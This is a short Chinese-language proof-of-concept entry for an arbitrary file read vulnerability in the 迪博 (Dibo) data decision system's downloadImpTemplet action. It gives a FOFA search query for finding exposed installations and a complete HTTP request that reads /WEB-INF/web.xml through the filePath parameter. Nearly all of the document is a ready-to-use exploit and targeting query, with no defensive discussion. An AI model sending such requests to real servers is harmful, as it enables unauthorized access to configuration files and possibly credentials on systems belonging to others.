## 迪博数据决策系统downloadImpTemplet存在任意文件读取

## fofa
```
body="common/dep/dep/Core.js"
```

## poc
```
GET /common/dep/common_dep.action.jsp?action=downloadImpTemplet&filePath=/WEB-INF/web.xml&fileName=12 HTTP/1.1
Host: 
Cookie: JSESSIONID=
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```
